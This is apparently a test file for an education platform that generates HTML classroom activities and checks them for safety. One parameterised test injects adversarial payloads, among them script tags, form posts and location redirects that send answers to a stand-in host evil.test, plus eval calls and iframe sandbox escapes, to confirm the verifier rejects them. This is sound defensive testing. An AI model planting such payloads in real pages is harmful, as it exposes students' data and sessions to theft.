import { describe, expect, it } from "vitest";
import type { LessonState } from "@kobi/ai-core";
import type { CurriculumMatch } from "@kobi/curriculum";
import {
  activityManifestSchema,
  activitySdkMessageSchema,
  createGamePlan,
  authorizeActivityTelemetryMessage,
  buildActivitySessionContext,
  createActivityArtifactCandidates,
  createUnguessableBundleRef,
  resolveApprovedActivityForBand,
  verifyActivityArtifact,
} from "./server.js";

const lessonState: LessonState = {
  topic: "La noticia y sus partes",
  objective_guess: "Identificar titular, entradilla y fuente en una noticia breve",
  key_terms: ["titular", "entradilla", "fuente", "hecho principal"],
  transcript_summary:
    "La docente explico las partes de una noticia con ejemplos del periodico escolar.",
  confidence: 0.88,
  evidence: {
    quoted_phrases: ["titular de la noticia", "la fuente nos dice quien informa"],
    reason: "La clase se centro en reconocer partes de una noticia.",
  },
};

const curriculumMatches: CurriculumMatch[] = [
  {
    objective_code: "L7.4.2",
    unit: "U4",
    grade: 7,
    subject: "lenguaje",
    text: "Reconoce la estructura de la noticia: titular, entradilla, cuerpo y fuente.",
    similarity: 0.91,
  },
];

class ActivityTestElement {
  className = "";
  type = "";
  textContent = "";
  disabled = false;
  readonly style: Record<string, string> = {};
  readonly children: ActivityTestElement[] = [];
  private readonly attributes: Record<string, string> = {};
  private readonly listeners: Record<string, Array<() => void>> = {};

  setAttribute(name: string, value: string) {
    this.attributes[name] = value;
  }

  getAttribute(name: string) {
    return this.attributes[name] ?? null;
  }

  addEventListener(name: string, listener: () => void) {
    (this.listeners[name] ??= []).push(listener);
  }

  appendChild(child: ActivityTestElement) {
    this.children.push(child);
  }

  click() {
    if (this.disabled) return;
    for (const listener of this.listeners.click ?? []) listener();
  }
}

function runActivityBundle(bundleHtml: string) {
  const elements: Record<string, ActivityTestElement> = {};
  for (const id of [
    "activity-title",
    "band-label",
    "prompt",
    "interaction",
    "order",
    "hint",
    "complete",
    "feedback",
  ]) {
    elements[id] = new ActivityTestElement();
  }
  elements.hint.disabled = true;
  elements.complete.disabled = true;
  const progress = new ActivityTestElement();
  const messages: unknown[] = [];
  const messageListeners: Array<(event: { source: unknown; data: unknown }) => void> = [];
  const parent = {
    postMessage(message: unknown) {
      messages.push(message);
    },
  };
  const testWindow = {
    parent,
    addEventListener(
      name: string,
      listener: (event: { source: unknown; data: unknown }) => void,
    ) {
      if (name === "message") messageListeners.push(listener);
    },
  };
  const document = {
    title: "",
    getElementById(id: string) {
      return elements[id];
    },
    createElement() {
      return new ActivityTestElement();
    },
    querySelector(selector: string) {
      return selector === ".progress span" ? progress : null;
    },
    querySelectorAll(selector: string) {
      return selector === ".option" ? elements.interaction.children : [];
    },
  };
  const inlineScript = bundleHtml.match(/<script>([\s\S]*)<\/script>/)?.[1];
  expect(inlineScript).toBeDefined();
  new Function("window", "document", inlineScript ?? "")(testWindow, document);

  return {
    document,
    elements,
    messages,
    respond(id: string, result: unknown) {
      for (const listener of messageListeners) {
        listener({
          source: parent,
          data: {
            sdk: "activity-sdk/v1",
            type: "response",
            id,
            ok: true,
            result,
          },
        });
      }
    },
  };
}

describe("activity artifact contracts", () => {
  it("builds bounded session context from lesson_state only", () => {
    const context = buildActivitySessionContext([lessonState]);

    expect(context.latest_topic).toBe("La noticia y sus partes");
    expect(context.vocabulary).toContain("titular");
    expect(JSON.stringify(context)).not.toContain("periodico escolar");
  });

  it("creates three verified HTML artifact candidates", () => {
    const context = buildActivitySessionContext([lessonState]);
    const candidates = createActivityArtifactCandidates({
      lessonState,
      sessionContext: context,
      curriculumMatches,
      activitySetId: "set-test",
    });

    expect(candidates).toHaveLength(3);
    expect(candidates.map((candidate) => candidate.manifest.difficulty_band)).toEqual([
      "support",
      "core",
      "challenge",
    ]);

    expect(new Set(candidates.map((candidate) => candidate.activity_set_id)).size).toBe(1);
    expect(new Set(candidates.map((candidate) => candidate.manifest.mechanic)).size).toBe(1);

    for (const candidate of candidates) {
      const result = verifyActivityArtifact(candidate);
      expect(result.ok, result.errors.join("; ")).toBe(true);
      expect(result.artifact.status).toBe("verified");
      expect(result.artifact.evidence[0].objective_code).toBe("L7.4.2");
      expect(candidate.bundle_html).not.toContain("<textarea");
      expect(candidate.bundle_html).not.toContain('type="radio"');
      expect(candidate.bundle_html).toContain('className = "option"');
      expect(candidate.bundle_html).toContain('score_unit: "count"');
      expect(candidate.bundle_html).toContain("if (!state.ready || state.completed) return");
      expect(candidate.bundle_html).toContain("completeButton.disabled = true");
      expect(candidate.bundle_html).not.toContain("preview-assignment");
      expect(candidate.bundle_html).not.toContain("assignment_id:");
      expect(candidate.bundle_html).not.toContain(JSON.stringify(candidate.manifest));
      expect(candidate.bundle_html).not.toContain(candidate.manifest.title);
      for (const item of candidate.manifest.content.items) {
        expect(candidate.bundle_html).not.toContain(item.prompt);
        for (const answer of item.answer_key) {
          expect(candidate.bundle_html).not.toContain(answer);
        }
        for (const hint of item.hints) {
          expect(candidate.bundle_html).not.toContain(hint);
        }
      }
      const inlineScript = candidate.bundle_html.match(/<script>([\s\S]*)<\/script>/)?.[1];
      expect(inlineScript).toBeDefined();
      expect(() => new Function(inlineScript ?? "")).not.toThrow();
    }
  });

  it("creates cryptographically unguessable bundle references", () => {
    const first = createUnguessableBundleRef("static");
    const second = createUnguessableBundleRef("static");

    expect(first).toMatch(
      /^artifact-bundles\/static\/[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}\/index\.html$/,
    );
    expect(second).not.toBe(first);
  });

  it.each([
    ["script injection", "<script src='https://evil.test/payload.js'></script>", "external or executable URL references are forbidden"],
    ["unsafe event handler", "<button onclick='window.top.location=`https://evil.test`'>Salir</button>", "inline event handlers are forbidden"],
    ["named link target", "<a href='#done' target='activityReport'>Informe</a>", "navigation targets are forbidden"],
    ["external network reference", "<img src='https://evil.test/tracker.png'>", "external or executable URL references are forbidden"],
    ["root-relative subresource", "<img src='/activity.js'>", "external or executable URL references are forbidden"],
    ["dot-relative subresource", "<script src='./main.js'></script>", "external or executable URL references are forbidden"],
    ["empty executable source", "<script src=''></script>", "external or executable URL references are forbidden"],
    ["fragment executable source", "<script src='#stub'></script>", "external or executable URL references are forbidden"],
    ["relative poster", "<video poster='asset.png'></video>", "external or executable URL references are forbidden"],
    ["relative srcset candidate", "<img srcset='asset.png 1x'>", "external or executable URL references are forbidden"],
    ["style import", "<style>@import './theme.css';</style>", "CSS URL references are forbidden"],
    ["style URL", "<style>body { background: url(asset.png); }</style>", "CSS URL references are forbidden"],
    ["SVG filter URL", "<svg><rect filter='url(./filters.svg#blur)'></rect></svg>", "SVG URL references are forbidden"],
    ["external SVG sprite", "<svg><use xlink:href='./sprite.svg#icon'></use></svg>", "external or executable URL references are forbidden"],
    ["eval", "<script>eval('reportComplete()')</script>", "eval is forbidden"],
    ["Function constructor", "<script>new Function('reportComplete()')()</script>", "Function constructor is forbidden"],
    ["artifact CSP", "<meta http-equiv='Content-Security-Policy' content=\"script-src 'none'\">", "artifact-controlled CSP meta tags are forbidden"],
    ["data script URL", "<script src='data:text/javascript,alert(1)'></script>", "external or executable URL references are forbidden"],
    ["form submission", "<form action='https://evil.test/collect'><input name='answer'></form>", "forms are forbidden"],
    ["storage access", "<script>localStorage.setItem('answer', 'secret')</script>", "localStorage is forbidden"],
    ["layout replacement", "<script>document.write('<main>replacement</main>')</script>", "document.write is forbidden"],
    ["writeln replacement", "<script>document.writeln('<main>replacement</main>')</script>", "document.write is forbidden"],
    ["bracketed document replacement", "<script>document['writeln']('<main>replacement</main>')</script>", "document.write is forbidden"],
    ["sandbox escape", "<iframe sandbox='allow-same-origin allow-top-navigation' srcdoc='<p>escape</p>'></iframe>", "nested browsing contexts are forbidden"],
    ["template descendants", "<template><iframe srcdoc='<p>escape</p>'></iframe></template>", "nested browsing contexts are forbidden"],
    ["script markup string", "<script>document.body.insertAdjacentHTML('beforeend', '<iframe srcdoc=\"<p>escape</p>\"></iframe>')</script>", "nested browsing contexts are forbidden"],
    ["meta navigation", "<meta http-equiv='refresh' content='0;url=https://evil.test'>", "meta refresh is forbidden"],
    ["self navigation", "<script>location.href = 'https' + '://evil.test/?a=' + answer</script>", "self-navigation is forbidden"],
    ["window navigation", "<script>window['location'].assign('/replacement')</script>", "self-navigation is forbidden"],
    ["indirect self navigation", "<script>document.defaultView.location = 'https' + '://evil.test/?a=' + answer</script>", "self-navigation is forbidden"],
  ])("rejects adversarial %s artifacts with a specific reason", (_name, payload, reason) => {
    const context = buildActivitySessionContext([lessonState]);
    const [candidate] = createActivityArtifactCandidates({
      lessonState,
      sessionContext: context,
      curriculumMatches,
      activitySetId: "set-security",
    });
    candidate.bundle_html = candidate.bundle_html.replace("</body>", `${payload}</body>`);

    const result = verifyActivityArtifact(candidate);

    expect(result.ok).toBe(false);
    expect(result.errors).toContain(reason);
  });

  it("allows data URLs for inline assets", () => {
    const context = buildActivitySessionContext([lessonState]);
    const [candidate] = createActivityArtifactCandidates({
      lessonState,
      sessionContext: context,
      curriculumMatches,
      activitySetId: "set-data-url",
    });
    candidate.bundle_html = candidate.bundle_html.replace(
      "</body>",
      '<img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" srcset="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs= 1x" alt="Punto"> </body>',
    );

    expect(verifyActivityArtifact(candidate).ok).toBe(true);
  });

  it("allows local SVG presentation references", () => {
    const context = buildActivitySessionContext([lessonState]);
    const [candidate] = createActivityArtifactCandidates({
      lessonState,
      sessionContext: context,
      curriculumMatches,
      activitySetId: "set-svg-fragment",
    });
    candidate.bundle_html = candidate.bundle_html.replace(
      "</body>",
      '<svg><defs><filter id="blur"></filter></defs><rect filter="url(#blur)"></rect></svg></body>',
    );

    expect(verifyActivityArtifact(candidate).ok).toBe(true);
  });

  it("allows local legacy SVG sprite references", () => {
    const context = buildActivitySessionContext([lessonState]);
    const [candidate] = createActivityArtifactCandidates({
      lessonState,
      sessionContext: context,
      curriculumMatches,
      activitySetId: "set-svg-sprite",
    });
    candidate.bundle_html = candidate.bundle_html.replace(
      "</body>",
      '<svg><symbol id="icon"><circle r="4"></circle></symbol><use xlink:href="#icon"></use></svg></body>',
    );

    expect(verifyActivityArtifact(candidate).ok).toBe(true);
  });

  it("rejects relative srcset candidates after an allowed data URL", () => {
    const context = buildActivitySessionContext([lessonState]);
    const [candidate] = createActivityArtifactCandidates({
      lessonState,
      sessionContext: context,
      curriculumMatches,
      activitySetId: "set-srcset",
    });
    candidate.bundle_html = candidate.bundle_html.replace(
      "</body>",
      '<img srcset="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=, asset.png 2x" alt="Punto"> </body>',
    );

    const result = verifyActivityArtifact(candidate);
    expect(result.ok).toBe(false);
    expect(result.errors).toContain("external or executable URL references are forbidden");
  });

  it("waits for SDK content and initializes an active manipulative in every band", () => {
    const context = buildActivitySessionContext([lessonState]);
    const candidates = createActivityArtifactCandidates({
      lessonState,
      sessionContext: context,
      curriculumMatches,
      activitySetId: "set-runtime",
    });

    for (const candidate of candidates) {
      const runtime = runActivityBundle(candidate.bundle_html);
      expect(runtime.messages).toEqual([
        {
          sdk: "activity-sdk/v1",
          type: "request",
          id: "manifest",
          method: "getManifest",
        },
        {
          sdk: "activity-sdk/v1",
          type: "request",
          id: "band",
          method: "getBand",
        },
      ]);
      expect(runtime.elements.interaction.children).toHaveLength(0);
      expect(runtime.elements.complete.disabled).toBe(true);

      runtime.respond("manifest", candidate.manifest);
      expect(runtime.elements.interaction.children).toHaveLength(0);
      runtime.respond("band", candidate.manifest.difficulty_band);

      expect(runtime.document.title).toBe(candidate.manifest.title);
      expect(runtime.elements["activity-title"].textContent).toBe(candidate.manifest.title);
      expect(runtime.elements.prompt.textContent).toBe(
        candidate.manifest.content.items[0].prompt,
      );
      expect(runtime.elements.interaction.children.length).toBeGreaterThan(0);
      expect(runtime.elements.hint.disabled).toBe(false);
      expect(runtime.elements.complete.disabled).toBe(false);

      runtime.elements.interaction.children[0].click();
      runtime.elements.hint.click();
      runtime.elements.complete.click();
      runtime.elements.complete.click();
      const eventMethods = runtime.messages
        .filter(
          (message): message is { type: string; method: string } =>
            typeof message === "object" &&
            message !== null &&
            "type" in message &&
            message.type === "event",
        )
        .map((message) => message.method);
      expect(eventMethods).toContain("reportAttempt");
      expect(eventMethods).toContain("reportHint");
      expect(eventMethods.filter((method) => method === "reportComplete")).toHaveLength(1);
    }
  });

  it("renders an order interaction when the shared plan uses a sequence mechanic", () => {
    const context = buildActivitySessionContext([lessonState]);
    const candidates = createActivityArtifactCandidates({
      lessonState,
      sessionContext: context,
      curriculumMatches,
      activitySetId: "set-sequence",
      gamePlan: {
        family: "sequence_order",
        mechanic: "timeline_builder",
        learning_goal: "Ordenar la estructura de una noticia.",
        interaction_metaphor: "linea de tiempo",
        kobi_visual_direction: "Azul Kobi",
        rationale: "La secuencia aumenta en complejidad por banda.",
        band_requirements: {
          support: "Dos pasos guiados.",
          core: "Tres pasos.",
          challenge: "Cuatro pasos con evidencia.",
        },
      },
    });

    for (const candidate of candidates) {
      expect(candidate.manifest.family).toBe("sequence_order");
      expect(candidate.manifest.content.items[0].prompt).toContain("Ordena");
      expect(candidate.bundle_html).toContain('id="order"');
      expect(candidate.bundle_html).toContain('state.manifest.family === "sequence_order"');
      expect(candidate.bundle_html).not.toContain("<textarea");
      const runtime = runActivityBundle(candidate.bundle_html);
      runtime.respond("band", candidate.manifest.difficulty_band);
      runtime.respond("manifest", candidate.manifest);
      expect(runtime.elements.interaction.children.length).toBe(
        candidate.manifest.content.items[0].answer_key.length,
      );
      runtime.elements.interaction.children[0].click();
      expect(runtime.elements.order.textContent).toContain("Tu orden:");
      expect(verifyActivityArtifact(candidate).ok).toBe(true);
    }
  });

  it("renders card manipulation for match/classify without form Q&A", () => {
    const context = buildActivitySessionContext([lessonState]);
    const candidates = createActivityArtifactCandidates({
      lessonState,
      sessionContext: context,
      curriculumMatches,
      activitySetId: "set-classify",
      gamePlan: {
        family: "match_classify",
        mechanic: "evidence_sorting_board",
        learning_goal: "Clasificar evidencia de una noticia.",
        interaction_metaphor: "mesa de clasificacion",
        kobi_visual_direction: "Azul Kobi",
        rationale: "Las tarjetas permiten revisar evidencia con manipulacion directa.",
        band_requirements: {
          support: "Dos tarjetas.",
          core: "Tres tarjetas.",
          challenge: "Cuatro tarjetas.",
        },
      },
    });

    for (const candidate of candidates) {
      const runtime = runActivityBundle(candidate.bundle_html);
      runtime.respond("manifest", candidate.manifest);
      runtime.respond("band", candidate.manifest.difficulty_band);
      expect(candidate.manifest.family).toBe("match_classify");
      expect(runtime.elements.interaction.children.length).toBeGreaterThan(
        candidate.manifest.content.items[0].answer_key.length,
      );
      expect(candidate.bundle_html).not.toContain("<textarea");
      expect(candidate.bundle_html).not.toContain('type="radio"');
      runtime.elements.interaction.children[0].click();
      expect(runtime.messages).toContainEqual(
        expect.objectContaining({ type: "event", method: "reportAttempt" }),
      );
    }
  });

  it("plans one coherent game concept with differentiated band requirements", () => {
    const context = buildActivitySessionContext([lessonState]);
    const plan = createGamePlan(context, curriculumMatches);

    expect(plan.mechanic).toBe("source_check_desk");
    expect(plan.learning_goal).toContain("verificar");
    expect(plan.band_requirements.support).toContain("Andamiaje");
    expect(plan.band_requirements.challenge).toContain("justificar");
  });

  it("rejects newly generated bundles that omit explicit completion score units", () => {
    const context = buildActivitySessionContext([lessonState]);
    const [candidate] = createActivityArtifactCandidates({
      lessonState,
      sessionContext: context,
      curriculumMatches,
      activitySetId: "set-score-contract",
    });

    const result = verifyActivityArtifact({
      ...candidate,
      bundle_html: candidate.bundle_html.replaceAll("score_unit", "scoreUnit"),
    });

    expect(result.ok).toBe(false);
    expect(result.errors).toContain("bundle is missing SDK hook: score_unit");
  });

  it("rejects editable manifest content embedded in bundle source", () => {
    const context = buildActivitySessionContext([lessonState]);
    const [candidate] = createActivityArtifactCandidates({
      lessonState,
      sessionContext: context,
      curriculumMatches,
      activitySetId: "set-manifest-owned-content",
    });
    const item = candidate.manifest.content.items[0];
    const embeddedValues = [
      ["manifest.title", candidate.manifest.title],
      ["manifest.content.items[0].prompt", item.prompt],
      ["manifest.content.items[0].answer_key[0]", item.answer_key[0]],
      ["manifest.content.items[0].hints[0]", item.hints[0]],
    ] as const;

    for (const [path, value] of embeddedValues) {
      const result = verifyActivityArtifact({
        ...candidate,
        bundle_html: candidate.bundle_html.replace("</body>", `<p>${value}</p></body>`),
      });
      expect(result.ok).toBe(false);
      expect(result.errors).toContain(`bundle embeds editable runtime content from ${path}`);
    }
  });

  it("keeps legacy manifests readable and validates free-form mechanic slugs", () => {
    const context = buildActivitySessionContext([lessonState]);
    const [candidate] = createActivityArtifactCandidates({
      lessonState,
      sessionContext: context,
      curriculumMatches,
      activitySetId: "set-test",
    });
    const legacy = {
      ...candidate.manifest,
      mechanic: undefined,
      learning_design: undefined,
      visual_theme: undefined,
    };

    expect(activityManifestSchema.safeParse(legacy).success).toBe(true);
    expect(
      activityManifestSchema.safeParse({
        ...candidate.manifest,
        family: "sequence_order",
        mechanic: "source_check_desk",
      }).success,
    ).toBe(true);
    expect(
      activityManifestSchema.safeParse({
        ...candidate.manifest,
        mechanic: "Not a valid mechanic!",
      }).success,
    ).toBe(false);
  });

  it("validates SDK telemetry messages", () => {
    const result = activitySdkMessageSchema.safeParse({
      sdk: "activity-sdk/v1",
      type: "event",
      method: "reportAttempt",
      payload: {
        assignment_id: "assignment-1",
        item_index: 0,
        correct: true,
      },
    });

    expect(result.success).toBe(true);
  });

  it("falls back to approved core activity for unapproved bands", () => {
    const approvals = [
      {
        difficulty_band: "core" as const,
        activity_id: "activity-core",
        candidate_id: "candidate-core",
        approved: true,
      },
      {
        difficulty_band: "challenge" as const,
        activity_id: "activity-challenge",
        candidate_id: "candidate-challenge",
        approved: false,
      },
    ];

    expect(resolveApprovedActivityForBand(approvals, "challenge")?.activity_id).toBe(
      "activity-core",
    );
    expect(resolveApprovedActivityForBand(approvals, "support")?.candidate_id).toBe(
      "candidate-core",
    );
    expect(resolveApprovedActivityForBand(approvals, "unknown")?.candidate_id).toBe(
      "candidate-core",
    );
  });

  it("authorizes telemetry from parent-owned assignment context", () => {
    const result = authorizeActivityTelemetryMessage(
      {
        sdk: "activity-sdk/v1",
        type: "event",
        method: "reportAttempt",
        payload: {
          assignment_id: "assignment-1",
          item_index: 0,
          correct: true,
        },
      },
      {
        assignmentId: "assignment-1",
        sourceMatches: true,
        eventOrigin: "https://kobi.test",
        allowedOrigin: "https://kobi.test",
      },
    );

    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.event).toMatchObject({
      assignment_id: "assignment-1",
      type: "attempt",
    });
  });

  it("stamps missing telemetry assignment ids from parent context", () => {
    const result = authorizeActivityTelemetryMessage(
      {
        sdk: "activity-sdk/v1",
        type: "event",
        method: "reportHint",
        payload: {
          item_index: 0,
          hint_index: 0,
        },
      },
      {
        assignmentId: "assignment-1",
        sourceMatches: true,
      },
    );

    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.event).toMatchObject({
      assignment_id: "assignment-1",
      type: "hint",
      payload: {
        assignment_id: "assignment-1",
        item_index: 0,
        hint_index: 0,
      },
    });
  });

  it("rejects ambiguous or impossible completion scores", () => {
    const authorizeComplete = (payload: Record<string, unknown>) =>
      authorizeActivityTelemetryMessage(
        {
          sdk: "activity-sdk/v1",
          type: "event",
          method: "reportComplete",
          payload,
        },
        { assignmentId: "assignment-1", sourceMatches: true },
      );

    expect(authorizeComplete({ score: 2 }).ok).toBe(false);
    expect(authorizeComplete({ score_unit: "count", score: 2, total: 1 }).ok).toBe(false);
    expect(authorizeComplete({ score_unit: "count", score: 0, total: 0 }).ok).toBe(false);
    expect(authorizeComplete({ score_unit: "count", score: 0.75, total: 4 }).ok).toBe(false);
    expect(authorizeComplete({ score_unit: "normalized", score: 0.75, total: 4 }).ok).toBe(false);
    expect(authorizeComplete({ score_unit: "normalized", score: 0.75 }).ok).toBe(true);
    expect(authorizeComplete({ score_unit: "count", score: 2, total: 4 }).ok).toBe(true);
  });

  it("rejects telemetry with spoofed assignment ids or rate-limit violations", () => {
    const spoofed = authorizeActivityTelemetryMessage(
      {
        sdk: "activity-sdk/v1",
        type: "event",
        method: "reportComplete",
        payload: {
          assignment_id: "other-assignment",
          score_unit: "count",
          score: 1,
          total: 1,
        },
      },
      {
        assignmentId: "assignment-1",
        sourceMatches: true,
      },
    );

    const rateLimited = authorizeActivityTelemetryMessage(
      {
        sdk: "activity-sdk/v1",
        type: "event",
        method: "reportHint",
        payload: {
          assignment_id: "assignment-1",
          item_index: 0,
          hint_index: 0,
        },
      },
      {
        assignmentId: "assignment-1",
        sourceMatches: true,
        eventsInRateWindow: 30,
      },
    );

    expect(spoofed.ok).toBe(false);
    expect(rateLimited.ok).toBe(false);
  });

  it("rejects artifacts that fail rubric thresholds", () => {
    const context = buildActivitySessionContext([lessonState]);
    const [candidate] = createActivityArtifactCandidates({
      lessonState,
      sessionContext: context,
      curriculumMatches,
      activitySetId: "set-test",
    });
    candidate.manifest.content.items[0].hints = ["La respuesta es titular"];

    const result = verifyActivityArtifact(candidate);

    expect(result.ok).toBe(false);
    expect(result.artifact.status).toBe("rejected");
    expect(result.errors).toContain("rubric: hint_leakage 0.35 is below 0.80");
  });
});
